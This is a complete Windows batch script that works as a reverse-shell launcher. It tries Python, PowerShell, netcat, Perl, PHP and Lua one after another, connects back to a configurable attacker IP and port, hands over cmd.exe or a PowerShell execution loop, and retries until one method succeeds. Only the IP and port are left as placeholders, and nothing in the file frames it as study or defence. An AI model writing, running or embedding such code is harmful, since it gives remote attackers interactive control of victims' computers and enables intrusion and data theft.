@echo off
set IP=YXYXYX
set PORT=XYXYXY
:retry
where python >nul 2>&1
if %ERRORLEVEL% == 0 (
    python -c "import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('%IP%', %PORT%)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call(['cmd.exe']);"
    if %ERRORLEVEL% == 0 goto success
)
where powershell >nul 2>&1
if %ERRORLEVEL% == 0 (
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('%IP%', %PORT%); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }; $client.Close()"
    if %ERRORLEVEL% == 0 goto success
)
where nc >nul 2>&1
if %ERRORLEVEL% == 0 (
    nc -e cmd.exe %IP% %PORT%
    if %ERRORLEVEL% == 0 goto success
)
where perl >nul 2>&1
if %ERRORLEVEL% == 0 (
    perl -e "use Socket;$i='%IP%';$p=%PORT%;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('cmd.exe');};"
    if %ERRORLEVEL% == 0 goto success
)
where php >nul 2>&1
if %ERRORLEVEL% == 0 (
    php -r "$sock=fsockopen('%IP%', %PORT%); exec('cmd.exe <&3 >&3 2>&3');"
    if %ERRORLEVEL% == 0 goto success
)
where lua >nul 2>&1
if %ERRORLEVEL% == 0 (
    lua -e "local host, port = '%IP%', %PORT%; local socket = require('socket'); local tcp = socket.tcp(); local io = require('io'); tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive(); local f = io.popen(cmd, 'r'); local s = f:read('*a'); f:close(); tcp:send(s); if status == 'closed' then break end end tcp:close();"
    if %ERRORLEVEL% == 0 goto success
)
goto retry
:success
echo Connection established successfully.
pause
